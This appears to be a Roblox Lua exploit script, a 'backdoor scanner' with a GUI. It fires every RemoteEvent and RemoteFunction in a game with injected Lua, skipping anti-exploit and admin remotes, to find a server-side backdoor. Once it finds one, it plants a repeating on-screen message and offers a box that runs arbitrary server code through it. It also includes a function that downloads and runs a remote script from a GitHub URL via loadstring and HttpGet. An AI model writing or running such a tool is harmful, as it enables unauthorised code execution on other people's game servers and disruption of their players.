-- Promto Backdoor Scanner - Real Working Version based on LALOHUB
local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")
local HttpService = game:GetService("HttpService")

-- Create advanced GUI
local PromtoGUI = Instance.new("ScreenGui")
PromtoGUI.Name = "PromtoBackdoor"
PromtoGUI.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
PromtoGUI.ResetOnSpawn = false

-- Main transparent frame
local MainFrame = Instance.new("Frame")
MainFrame.Size = UDim2.new(0, 400, 0, 400)
MainFrame.Position = UDim2.new(0.5, -200, 0.5, -200)
MainFrame.BackgroundColor3 = Color3.fromRGB(15, 15, 25)
MainFrame.BackgroundTransparency = 0.15
MainFrame.BorderSizePixel = 0

-- Glass effect
local UICorner = Instance.new("UICorner")
UICorner.CornerRadius = UDim.new(0, 20)
UICorner.Parent = MainFrame

local UIStroke = Instance.new("UIStroke")
UIStroke.Color = Color3.fromRGB(100, 100, 255)
UIStroke.Thickness = 2
UIStroke.Transparency = 0.2
UIStroke.Parent = MainFrame

-- Title with glow
local TitleFrame = Instance.new("Frame")
TitleFrame.Size = UDim2.new(1, 0, 0, 70)
TitleFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 45)
TitleFrame.BackgroundTransparency = 0.3
TitleFrame.BorderSizePixel = 0

local TitleUICorner = Instance.new("UICorner")
TitleUICorner.CornerRadius = UDim.new(0, 20)
TitleUICorner.Parent = TitleFrame

local TitleLabel = Instance.new("TextLabel")
TitleLabel.Size = UDim2.new(1, 0, 1, 0)
TitleLabel.Text = "🛡️ PROMTO BACKDOOR"
TitleLabel.TextColor3 = Color3.fromRGB(220, 220, 255)
TitleLabel.Font = Enum.Font.GothamBlack
TitleLabel.TextSize = 22
TitleLabel.BackgroundTransparency = 1
TitleLabel.TextStrokeTransparency = 0.7

-- Scan button
local ScanButton = Instance.new("TextButton")
ScanButton.Size = UDim2.new(0, 250, 0, 50)
ScanButton.Position = UDim2.new(0.5, -125, 0.3, 0)
ScanButton.BackgroundColor3 = Color3.fromRGB(0, 150, 255)
ScanButton.BackgroundTransparency = 0.1
ScanButton.Text = "🔍 START SCANNING"
ScanButton.TextColor3 = Color3.fromRGB(255, 255, 255)
ScanButton.Font = Enum.Font.GothamBold
ScanButton.TextSize = 16

local ScanButtonCorner = Instance.new("UICorner")
ScanButtonCorner.CornerRadius = UDim.new(0, 12)
ScanButtonCorner.Parent = ScanButton

-- Command section
local CommandFrame = Instance.new("Frame")
CommandFrame.Size = UDim2.new(0, 350, 0, 150)
CommandFrame.Position = UDim2.new(0.06, 0, 0.5, 0)
CommandFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 35)
CommandFrame.BackgroundTransparency = 0.2
CommandFrame.Visible = false

local CommandCorner = Instance.new("UICorner")
CommandCorner.CornerRadius = UDim.new(0, 15)
CommandCorner.Parent = CommandFrame

local CommandBox = Instance.new("TextBox")
CommandBox.Size = UDim2.new(0, 330, 0, 100)
CommandBox.Position = UDim2.new(0.03, 0, 0.1, 0)
CommandBox.BackgroundColor3 = Color3.fromRGB(35, 35, 55)
CommandBox.TextColor3 = Color3.fromRGB(255, 255, 255)
CommandBox.PlaceholderText = "Enter your command here..."
CommandBox.TextWrapped = true
CommandBox.ClearTextOnFocus = false
CommandBox.TextXAlignment = Enum.TextXAlignment.Left
CommandBox.TextYAlignment = Enum.TextYAlignment.Top

local CommandCorner2 = Instance.new("UICorner")
CommandCorner2.CornerRadius = UDim.new(0, 10)
CommandCorner2.Parent = CommandBox

-- Execute button
local ExecuteButton = Instance.new("TextButton")
ExecuteButton.Size = UDim2.new(0, 140, 0, 35)
ExecuteButton.Position = UDim2.new(0.5, -70, 0.8, 0)
ExecuteButton.BackgroundColor3 = Color3.fromRGB(0, 200, 100)
ExecuteButton.BackgroundTransparency = 0.1
ExecuteButton.Text = "🚀 EXECUTE"
ExecuteButton.TextColor3 = Color3.fromRGB(255, 255, 255)
ExecuteButton.Font = Enum.Font.GothamSemibold
ExecuteButton.Visible = false

local ExecuteCorner = Instance.new("UICorner")
ExecuteCorner.CornerRadius = UDim.new(0, 10)
ExecuteCorner.Parent = ExecuteButton

-- Status label
local StatusLabel = Instance.new("TextLabel")
StatusLabel.Size = UDim2.new(1, 0, 0, 50)
StatusLabel.Position = UDim2.new(0, 0, 0.85, 0)
StatusLabel.BackgroundTransparency = 1
StatusLabel.Text = "Ready to scan for backdoors..."
StatusLabel.TextColor3 = Color3.fromRGB(200, 200, 230)
StatusLabel.Font = Enum.Font.Gotham
StatusLabel.TextSize = 14
StatusLabel.TextWrapped = true

-- Assemble GUI
TitleLabel.Parent = TitleFrame
TitleFrame.Parent = MainFrame
ScanButton.Parent = MainFrame
CommandBox.Parent = CommandFrame
CommandFrame.Parent = MainFrame
ExecuteButton.Parent = MainFrame
StatusLabel.Parent = MainFrame
MainFrame.Parent = PromtoGUI
PromtoGUI.Parent = game:GetService("CoreGui")

-- Real backdoor scanning function based on LALOHUB logic
local function generateName(length)
    local alphabet = {'a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z'}
    local text = ''
    for i = 1, length do
        text = text .. alphabet[math.random(1, #alphabet)]
    end
    return text
end

local function runRemote(remote, data)
    if remote:IsA('RemoteEvent') then
        remote:FireServer(data)
    elseif remote:IsA('RemoteFunction') then
        spawn(function() remote:InvokeServer(data) end)
    end
end

local function findBackdoor()
    StatusLabel.Text = "🔄 Scanning game for backdoors..."
    
    local remotes = {}
    local foundBackdoor = nil
    
    -- Check for protected backdoor first
    local protected_backdoor = game:GetService('ReplicatedStorage'):FindFirstChild('lh'..game.PlaceId/6666*1337*game.PlaceId)
    if protected_backdoor and protected_backdoor:IsA('RemoteFunction') then
        local code = generateName(math.random(12,30))
        spawn(function() 
            protected_backdoor:InvokeServer('promto backdoor scanner', "a=Instance.new('Model',workspace)a.Name='"..code.."'") 
        end)
        remotes[code] = protected_backdoor
    end
    
    -- Scan all remotes
    for _, remote in pairs(game:GetDescendants()) do
        if not remote:IsA('RemoteEvent') and not remote:IsA('RemoteFunction') then 
            continue 
        end
        
        -- Skip system remotes
        if string.split(remote:GetFullName(), '.')[1] == 'RobloxReplicatedStorage' then
            continue
        end
        
        if remote.Parent == game:GetService("ReplicatedStorage") or 
           remote.Parent.Parent == game:GetService("ReplicatedStorage") or 
           remote.Parent.Parent.Parent == game:GetService("ReplicatedStorage") then
            
            -- Skip known anti-exploit systems
            if remote:FindFirstChild('__FUNCTION') or remote.Name == '__FUNCTION' then
                continue
            end
            
            if remote.Parent.Parent.Name == 'HDAdminClient' and remote.Parent.Name == 'Signals' then
                continue
            end
            
            if remote.Parent.Name == 'DefaultChatSystemChatEvents' then
                continue
            end
        end
        
        -- Test the remote
        local code = generateName(math.random(12,30))
        runRemote(remote, "a=Instance.new('Model',workspace)a.Name='"..code.."'")
        remotes[code] = remote
    end
    
    -- Check for successful backdoors
    for i = 1, 50 do
        for code, remote in pairs(remotes) do
            if workspace:FindFirstChild(code) then
                StatusLabel.Text = "✅ Backdoor found: " .. remote:GetFullName()
                
                -- Send test commands
                runRemote(remote, "a=Instance.new('Hint')a.Text='Promto Backdoor Scanner - Active'while true do a.Parent=workspace;wait(15)a:Remove()wait(30)end")
                
                return remote
            end
        end
        wait(0.1)
    end
    
    StatusLabel.Text = "❌ No backdoors found"
    return nil
end

-- Button interactions
ScanButton.MouseButton1Click:Connect(function()
    ScanButton.Text = "🔄 SCANNING..."
    
    local backdoor = findBackdoor()
    
    if backdoor then
        _G.PromtoBackdoor = backdoor
        CommandFrame.Visible = true
        ExecuteButton.Visible = true
        ScanButton.Visible = false
        StatusLabel.Text = "✅ Ready! Enter commands below"
        
        -- Show notification
        game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "Promto Backdoor",
            Text = "Backdoor scanner activated successfully!",
            Duration = 5
        })
    else
        ScanButton.Text = "🔍 RETRY SCAN"
        StatusLabel.Text = "⚠️ No backdoors detected. Try again"
    end
end)

ExecuteButton.MouseButton1Click:Connect(function()
    if _G.PromtoBackdoor and CommandBox.Text ~= "" then
        local success, err = pcall(function()
            runRemote(_G.PromtoBackdoor, CommandBox.Text)
        end)
        
        if success then
            StatusLabel.Text = "✅ Command executed successfully!"
        else
            StatusLabel.Text = "❌ Error: " .. tostring(err)
        end
    end
end)

-- Load external script when needed
local function loadExternalScript()
    local success, result = pcall(function()
        return loadstring(game:HttpGet("https://raw.githubusercontent.com/112312312313/testscript/refs/heads/main/test.lua"))()
    end)
    
    if success then
        StatusLabel.Text = "✅ External script loaded!"
        return result
    else
        StatusLabel.Text = "❌ Failed to load external script"
        return nil
    end
end

-- Drag functionality
local dragging = false
local dragInput, dragStart, startPos

MainFrame.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        dragging = true
        dragStart = input.Position
        startPos = MainFrame.Position
    end
end)

MainFrame.InputChanged:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseMovement then
        dragInput = input
    end
end)

UserInputService.InputChanged:Connect(function(input)
    if dragging and input == dragInput then
        local delta = input.Position - dragStart
        MainFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
    end
end)

MainFrame.InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        dragging = false
    end
end)

-- Initial setup
game:GetService("StarterGui"):SetCore("SendNotification", {
    Title = "Promto Backdoor",
    Text = "Scanner GUI loaded successfully!",
    Duration = 5
})
